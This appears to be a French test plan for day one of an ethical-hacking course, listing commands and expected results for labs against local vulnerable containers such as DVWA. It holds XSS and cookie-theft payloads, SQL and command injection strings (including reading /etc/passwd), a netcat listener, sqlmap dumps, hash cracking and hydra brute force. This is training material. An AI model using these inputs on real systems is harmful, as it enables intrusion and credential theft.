# Plan de test — Jour 1

**Date** : 2026-06-30
**Repo** : `techniques-de-hacking-niveau-1` (branch `main`)
**Source de vérité** : `JOUR-01-introduction-hacking-ethique-vulnerabilites.md`

---

## Tests à exécuter

### 1.1 Vérification des outils
| # | Commande | Attendu |
|---|----------|---------|
| 1.1.1 | `python3 --version` | Python 3.10+ |
| 1.1.2 | `docker --version` | Docker 24+ |
| 1.1.3 | `nmap --version` | Nmap 7.94 |
| 1.1.4 | `sqlmap --version` | sqlmap 1.7 |
| 1.1.5 | `which nc` | /usr/bin/nc |

### 1.2 Démarrage conteneurs
| # | Commande | Attendu |
|---|----------|---------|
| 1.2.1 | `docker compose ps --services` | dvwa, sqli-app, vsftpd, buffovf, waf, secure-linux, forensic-victim |
| 1.2.2 | `curl http://localhost:8088/login.php` | HTTP 200 |
| 1.2.3 | `curl http://localhost:8083` | HTTP 200 |

### LAB-1 — Plan d'attaque
| # | Commande | Attendu |
|---|----------|---------|
| L1.1 | `attack-layer-jour1.json` validé | JSON valide, 5 techniques |

### LAB-2 — Scan DVWA
| # | Commande | Attendu |
|---|----------|---------|
| L2.1 | `nmap -sV -p 8088 localhost` | `8088/tcp open http Apache httpd 2.4.X` |
| L2.2 | `gobuster dir -u ... -w common.txt` | `/login.php (200)`, `/vulnerabilities (301)`, `/config (301)`, `/setup.php (200)` |
| L2.3 | `curl ... login.php \| grep -o "Welcome\|Login failed"` | `Welcome` |
| L2.4 | `curl ... security.php` | Cookie mis à jour security=low |
| L2.5 | `curl http://localhost:8088/test-empty/` | `403` |

### LAB-3 — XSS
| # | Commande | Attendu |
|---|----------|---------|
| L3.1 | Reflected XSS `<script>alert('XSS fonctionnel')</script>` | Popup JavaScript |
| L3.2 | Cookie theft payload | `GET /?cookie=PHPSESSID=...` |
| L3.3 | Stored XSS `<script>alert('Stored XSS')</script>` | Popup à chaque chargement |
| L3.4 | `grep 'session.cookie_httponly'` | `session.cookie_httponly = 1` |
| L3.5 | `curl ... xss_r ... \| grep -o "&lt;script&gt;\|alert"` | `&lt;script&gt;` |

### LAB-4 — SQLi
| # | Commande | Attendu |
|---|----------|---------|
| L4.1 | `curl ... id=1' OR '1'='1' \| grep -c "First name"` | `5` |
| L4.2 | sqlmap `--dump` 5 users | 5 hashs MD5 |

### LAB-5 — CMDi
| # | Commande | Attendu |
|---|----------|---------|
| L5.1 | `127.0.0.1; whoami` | `www-data` |
| L5.2 | `127.0.0.1; cat /etc/passwd` | Liste utilisateurs |
| L5.3 | `nc -lvnp 4444` (écouteur) | `Listening on 0.0.0.0:4444` |

### LAB-6 — SQLi avancée
| # | Commande | Attendu |
|---|----------|---------|
| L6.1 | `curl ... id=1 OR 1=1 \| grep -c "<tr>"` | `6` |
| L6.2 | `curl ... id=1 AND 1=2 \| grep -o "Aucun"` | `Aucun produit trouvé` |
| L6.3 | `curl ... admin' -- \| grep "Connecté"` | `Connecté en tant que admin` |
| L6.4 | `curl ... filter=... UNION SELECT \| grep "<td>"` | `<td>1</td><td>admin</td>...` |
| L6.5 | sqlmap `--tables` | `[2 tables] → products, users` |
| L6.6 | sqlmap `--dump` 6 users | 6 hashs MD5 |
| L6.7 | `john --format=raw-md5` | 6 mots de passe crackés |
| L6.8 | sqlmap `secret_flag` | `FLAG{sql_injection_master}` |

### LAB-7 — Hydra
| # | Commande | Attendu |
|---|----------|---------|
| L7.1 | `curl ... login.php \| grep -o 'name="[^"]*"'` | `name="username" name="password" name="Login"` |
| L7.2 | `curl ... badpassword \| grep -oi "login failed\|failed"` | `Login failed` |
| L7.3 | `hydra -l admin -P rockyou.txt ...` | `admin:password` |
| L7.4 | `hydra -L logins.txt -P rockyou.txt ... -F` | `admin:password` |

---

## Fichiers de sortie attendus

- `rendu_labs/jour-01/plan-attaque-j1.json`
- `rendu_labs/jour-01/nmap_dvwa.txt`
- `rendu_labs/jour-01/gobuster_dvwa.txt`
- `/tmp/dvwa_cookie.txt` (avec security=low)
- `rendu_labs/jour-01/sqli_tables.txt`
- `rendu_labs/jour-01/sqli_dump.txt`
- `rendu_labs/jour-01/hashes.txt`
- `rendu_labs/jour-01/hydra_dvwa.txt`
- `rendu_labs/jour-01/hydra_multi.txt`
